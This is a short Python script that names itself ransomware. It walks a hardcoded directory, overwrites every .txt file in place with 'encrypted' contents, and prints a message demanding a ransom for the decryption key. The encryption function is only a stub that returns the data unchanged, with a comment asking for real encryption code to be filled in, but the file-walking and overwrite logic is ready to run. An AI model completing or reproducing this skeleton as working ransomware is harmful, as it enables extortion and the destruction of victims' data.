import os

def encrypt_files(directory):
    files = os.listdir(directory)
    for file in files:
        if file.endswith('.txt'):
            with open(os.path.join(directory, file), 'rb+') as f:
                contents = f.read()
                encrypted_contents = encrypt(contents)
                f.seek(0)
                f.write(encrypted_contents)
                f.truncate()

def encrypt(data):
    # Encryption algorithm implementation
    encrypted_data = data  # Replace with actual encryption code
    return encrypted_data

def main():
    # Code executed by the ransomware
    encrypt_files('D:/fuck')
    display_ransom_message()

def display_ransom_message():
    # Code to display the ransom message
    message = "Your files have been encrypted. Pay the ransom to get the decryption key."
    print(message)

if __name__ == '__main__':
    main()
